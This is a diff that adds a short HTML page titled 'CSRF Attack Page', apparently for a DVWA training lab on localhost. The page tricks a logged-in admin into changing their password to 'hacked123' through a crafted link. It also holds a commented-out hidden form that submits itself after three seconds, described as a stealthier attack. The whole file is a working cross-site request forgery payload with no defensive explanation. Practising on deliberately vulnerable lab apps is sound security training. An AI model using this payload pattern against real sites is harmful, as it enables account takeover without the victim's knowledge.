@@ -1,0 +1,24 @@
+<html>
+  <body>
+    <h1>CSRF Attack Page</h1>
+    <p>Click the link below to change the admin password:</p>
+    <a href="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change">
+      Click here
+    </a>
+    
+    <!-- Alternative: Auto-submitting form for stealthier attack -->
+    <!-- <h2>Or wait 3 seconds for automatic password change...</h2>
+    <form id="csrfForm" action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
+      <input type="hidden" name="password_new" value="hacked123">
+      <input type="hidden" name="password_conf" value="hacked123">
+      <input type="hidden" name="Change" value="Change">
+    </form>
+    
+    <script>
+      // Auto-submit after 3 seconds
+      setTimeout(function() {
+        document.getElementById("csrfForm").submit();
+      }, 3000);
+    </script> -->
+  </body>
+</html>
